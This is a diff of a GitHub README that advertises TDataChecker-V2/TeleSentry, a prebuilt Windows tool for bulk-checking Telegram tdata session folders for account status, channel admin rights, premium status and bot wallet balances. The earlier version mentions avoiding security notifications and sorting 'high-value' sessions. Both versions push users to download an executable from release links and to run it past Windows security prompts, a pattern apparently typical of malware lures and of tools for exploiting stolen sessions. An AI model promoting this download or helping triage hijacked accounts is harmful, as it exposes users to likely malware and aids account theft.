@@ -1,48 +1,140 @@
-# ✈️ TeleSentry: The Ultimate TData & Session Auditor 🚀
+# 🛡️ TDataChecker-V2 - Fast Telegram TData Checks Made Simple
 
-A high-performance engine designed to audit, verify, and parse metadata from Telegram Desktop `tdata` folders and session files.
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20the%20Project%20Page-blue?style=for-the-badge)](https://github.com/IVANMURGA2710/TDataChecker-V2)
 
----
+## 📥 Download
 
-### 🌟 Project Overview
-**TeleSentry** is an enterprise-grade utility for digital forensic researchers and community managers. In the 2026 landscape, managing hundreds of Telegram sessions requires precision. TeleSentry allows you to bulk-check `tdata` folders to identify account status, premium subscription presence, managed channels (Admin rights), and even wallet balances in popular Telegram bots—all without triggering unnecessary security notifications.
+Use this link to visit the project page and download the app for Windows:
 
-### ⚡ Key Features
+[https://github.com/IVANMURGA2710/TDataChecker-V2](https://github.com/IVANMURGA2710/TDataChecker-V2)
 
-* **Instant TData Validation:** Verify if a session is alive, limited (SPAM-block), or terminated in milliseconds.
-* **Admin Rights Detector:** Automatically identifies if the account owns or manages channels/groups (displays member counts).
-* **Premium & Status Tracker:** Flags accounts with Telegram Premium and extracts account creation dates.
-* **Bot Balance Scraper:** Integrated modules to check balances in common crypto and giveaway bots.
-* **Privacy Hardening:** Option to automatically terminate all other active sessions or set/change 2FA passwords.
-* **Bulk Export:** Save "High-Value" sessions (Admins, Premium, Old accounts) into organized folders or JSON reports.
+## 🖥️ What This App Does
 
-### 🏆 Technical Advantages
+TDataChecker-V2 helps you open Telegram session data, check accounts, and review key profile details from local files. It is built for users who want a simple way to inspect Telegram TData on Windows without manual steps.
 
-1.  **Native MTProto Implementation:** Uses a custom C++/Python bridge to interact directly with Telegram servers, mimicking official Desktop Client behavior.
-2.  **No-Install Execution:** Works directly with the `tdata` folder structure—no need to launch the Telegram app.
-3.  **Advanced Metadata Extraction:** Pulls phone numbers (if visible), usernames, and bio information without full synchronization.
+It can help you with:
 
-### 🛠️ Quick Start & Installation (GUI Version)
+- Checking Telegram TData folders
+- Reading session details from local data
+- Finding channel admin status
+- Pulling bot balance info where available
+- Parsing metadata without a proxy
+- Reviewing archive data in a clear format
 
-For the most stable session handling and highest speeds, use the **pre-compiled Windows Suite**.
+## 🚀 Getting Started
 
-1.  **Download:** Get the latest `Installer.zip` from the [Releases](https://github.com/leogayd8611/TDataChecker-V2/releases) tab.
+Follow these steps on Windows:
 
-### https://github.com/leogayd8611/TDataChecker-V2/releases/tag/2026
+1. Open the download link above.
+2. Download the app from the project page.
+3. Save the file to your Desktop or Downloads folder.
+4. If the download comes as a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
 
-2.  **Extract:** Unzip to a folder (e.g., `C:\TeleSentry\`).
-3.  **Initialize:** Run `Installer.exe` to register the MTProto schemas.
-4.  **Launch:** Open `TeleSentry_GUI.exe`.
-5.  **Audit:** Drag and drop your folder containing multiple `tdata` directories and click **"Start Deep Audit"**.
+If Windows asks for permission, choose Run anyway or Yes.
 
----
+## 🪟 Windows Setup
 
-> **Disclaimer:** This tool is for educational purposes, forensic research, and personal account recovery only. Unauthorized access to Telegram sessions is illegal. The developers do not support or encourage misuse.
+TDataChecker-V2 is made for Windows users. For the smoothest start, use a recent Windows 10 or Windows 11 PC.
 
----
+Recommended setup:
 
-## 🔍 SEO Meta Description
+- Windows 10 or Windows 11
+- At least 4 GB RAM
+- 500 MB free disk space
+- A stable internet connection
+- Telegram TData files stored on your PC
 
-**Free Telegram TData Checker 2026 - Best Session Auditor and Channel Admin Finder.**
+If you use a ZIP file, keep the folder structure intact after extraction. The app may look for files in the same place where you saved them.
 
-Download TeleSentry, the most advanced open-source checker for Telegram Desktop tdata. This repository features a high-speed session validator, premium tracker, and bot balance scraper. Optimized for 2026 MTProto layers. If you need to audit your Telegram sessions for admin rights or premium status, TeleSentry is the best solution on GitHub.
+## 📂 How to Use It
+
+1. Launch TDataChecker-V2.
+2. Choose the folder that contains your Telegram TData files.
+3. Let the app scan the local session data.
+4. Review the account details shown on screen.
+5. Check the channel admin and session info.
+6. Export or save the results if the app offers that option.
+
+If the app asks for a path, select the exact folder that contains the Telegram data. Do not move files while the scan is running.
+
+## 🔎 Main Features
+
+### 👤 TData Session Checking
+
+The app scans Telegram TData and shows the session state in a simple view. This helps you review local account data without opening files by hand.
+
+### 🛡️ Channel Admin Detection
+
+TDataChecker-V2 can look for channel admin status and related account roles. This makes it easier to spot access levels in a Telegram session.
+
+### 🤖 Bot Balance Scraping
+
+The app can read bot balance data when the session includes that kind of information. It shows the data in a format that is easier to check.
+
+### 📄 Metadata Parsing
+
+The app reads Telegram metadata from local files and turns it into usable details. It works without a proxy and keeps the process direct.
+
+### 📦 Archive Recovery
+
+If you have backed-up Telegram data, the app can help inspect older archive files and session records. This can be useful when you need to review saved data later.
+
+## 🧭 Typical Use Cases
+
+- Checking a Telegram account before use
+- Reviewing local session data from a backup
+- Finding admin status in a channel session
+- Reading bot-related balance data
+- Sorting through archived TData folders
+- Auditing Telegram data on a personal Windows PC
+
+## 📁 File Format Tips
+
+For best results, use the original Telegram TData folder or a clean backup of it. If the app cannot read the data, check these points:
+
+- The folder is fully extracted
+- The files are not renamed
+- The data is not inside a nested folder
+- You selected the right directory
+- Another app is not locking the files
+
+## 🛠️ Basic Troubleshooting
+
+### App will not open
+
+- Right-click the app and choose Run as administrator
+- Make sure the download finished
+- Check that Windows did not block the file
+- Extract ZIP files before opening the app
+
+### App cannot find data
+
+- Confirm that you selected the TData folder
+- Check that the folder contains Telegram session files
+- Try a different backup if the files look damaged
+
+### Windows shows a security prompt
+
+- Open the file from a folder you trust
+- Confirm that the file came from the project page
+- Choose the option that allows the app to run
+
+## 🔐 Privacy and Local Use
+
+The app works with files on your own computer. Keep your Telegram data in a private folder and do not share it with others. Use only files you own or are allowed to inspect.
+
+## 🧩 Project Details
+
+**Repository:** TDataChecker-V2  
+**Description:** TeleSentry (2026) — High-Speed Telegram TData Checker & Session Auditor. Features Automatic Channel Admin Detection, Bot Balance Scraping, and Proxy-less Metadata Parsing. Professional Archive Recovery & Security Suite.  
+**Topics:** channel-admin-finder, checker, cyber-security-tool, mtproto-api, premium, premium-checker, session-auditor, tdata-checker, tdata-parser, telegram, telegram-bot-checker, telegram-checker-2026, telegram-premium-checker, telegram-session-checker, tg, tg-checker
+
+## 📦 Download and Run
+
+Visit the project page here and download the Windows app:
+
+[https://github.com/IVANMURGA2710/TDataChecker-V2](https://github.com/IVANMURGA2710/TDataChecker-V2)
+
+After download, extract the file if needed, then open the app on Windows
